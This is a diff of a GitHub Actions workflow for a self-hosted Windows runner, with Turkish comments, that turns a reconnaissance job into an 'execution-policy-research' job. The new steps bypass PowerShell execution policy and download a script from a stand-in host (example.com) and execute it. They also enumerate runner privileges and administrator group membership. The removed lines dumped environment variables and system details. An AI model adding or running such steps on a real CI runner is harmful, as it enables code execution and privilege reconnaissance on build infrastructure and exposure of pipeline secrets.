@@ -1,24 +1,35 @@
-name: security-audit
+name: execution-policy-research
 on: workflow_dispatch
 jobs:
-  audit:
+  policy-test:
     runs-on: [self-hosted, Windows, X64]
     steps:
-      - name: System Info
-        shell: powershell
+      # Test 1: Policy durumu
+      - name: Check Policy
+        shell: cmd
+        run: powershell -Command "Get-ExecutionPolicy -List"
+      
+      # Test 2: Bypass methods
+      - name: Bypass Method 1 - Command
+        shell: cmd
+        run: powershell -ExecutionPolicy Bypass -Command "Write-Host 'Bypass successful!'"
+      
+      - name: Bypass Method 2 - EncodedCommand
+        shell: cmd
         run: |
-          Write-Host "=== KULLANICI VE YETKİLER ==="
-          whoami
+          echo $text = 'whoami'; Invoke-Expression $text > encoded.ps1
+          powershell -ExecutionPolicy Bypass -File encoded.ps1
+      
+      - name: Bypass Method 3 - Download & Execute
+        shell: cmd
+        run: |
+          powershell -Command "Invoke-WebRequest -Uri 'https://example.com/script.ps1' -OutFile test.ps1"
+          powershell -ExecutionPolicy Bypass -File test.ps1
+      
+      # Test 4: Runner kullanıcısının yetkileri
+      - name: Check Runner Permissions
+        shell: cmd
+        run: |
           whoami /priv
-          whoami /groups
-          
-          Write-Host "`n=== ORTAM DEĞİŞKENLERİ ==="
-          Get-ChildItem env: | Format-Table -AutoSize
-          
-          Write-Host "`n=== RUNNER KONUMU ==="
-          Get-Location
-          echo "RUNNER_WORKSPACE: $env:RUNNER_WORKSPACE"
-          echo "GITHUB_WORKSPACE: $env:GITHUB_WORKSPACE"
-          
-          Write-Host "`n=== SİSTEM BİLGİSİ ==="
-          systeminfo | Select-String "OS Name","OS Version","System Type"
+          net user %USERNAME%
+          net localgroup administrators
